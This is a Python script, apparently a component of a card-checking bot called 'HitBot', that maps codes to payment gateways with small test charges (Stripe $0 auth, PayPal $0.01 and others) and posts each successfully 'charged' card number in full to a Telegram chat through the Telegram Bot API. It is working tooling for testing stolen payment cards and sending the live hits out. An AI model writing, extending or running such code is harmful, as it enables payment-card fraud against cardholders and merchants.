import sys
import json
import os
import requests

GATEWAY_NAMES = {
    "st": "Stripe Auth $0",
    "skl": "Stripe Auth $0.1",
    "b3": "Braintree Auth",
    "vbv": "VBV Lookup",
    "an": "Authorize.net Auth",
    "skb": "SK Base Auth $0",
    "adn": "Adyen Auth",
    "cw": "Stripe Charge $6",
    "rz": "Razorpay Charge",
    "charge": "Stripe Charge SK",
    "pp": "PayPal Charge $0.01",
    "shp": "Shopify",
    "skl1": "Stripe Charge $1",
    "skl2": "Stripe Charge $7",
    "b3c": "Braintree Charge",
    "ppn": "PayPal Charge $1",
    "bnc": "PayPal Charge $1",
    "ch": "Stripe Charge \u20ac5",
    "isp": "Stripe Charge $25",
    "auto": "Stripe Random Charge",
    "azz": "Authorize.net Charge $1",
    "ppk": "PayPal Keybase $1",
}

def forward_charged_card(user_id, card, gateway, response_msg):
    config_path = os.path.join(os.path.dirname(__file__), "config.json")
    try:
        with open(config_path, "r") as f:
            config = json.load(f)
    except Exception:
        print(json.dumps({"sent": False, "error": "Config not found"}))
        return

    bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
    if not bot_token:
        print(json.dumps({"sent": False, "error": "No bot token"}))
        return

    def escape_md(s):
        for ch in ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']:
            s = s.replace(ch, '\\' + ch)
        return s

    gate_display = GATEWAY_NAMES.get(gateway, gateway)
    safe_response = escape_md(response_msg)
    safe_gateway = escape_md(gate_display)

    text = (
        f"\U0001f525\U0001f525\U0001f525 *CHARGED* \U0001f525\U0001f525\U0001f525\n"
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
        f"\U0001f4b3 *Card:* `{card}`\n"
        f"\u26a1 *Gateway:* {safe_gateway}\n"
        f"\u2705 *Response:* {safe_response}\n\n"
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        f"\U0001f4a5 *HitBot* \u2022 _Charged Successfully_"
    )

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        resp = requests.post(url, json={
            "chat_id": int(user_id),
            "text": text,
            "parse_mode": "Markdown"
        }, timeout=10)
        result = resp.json()
        print(json.dumps({"sent": result.get("ok", False)}))
    except Exception as e:
        print(json.dumps({"sent": False, "error": str(e)}))

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(json.dumps({"sent": False, "error": "Usage: web_forward_hit.py <user_id> <card> <gateway> <response>"}))
        sys.exit(1)

    forward_charged_card(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
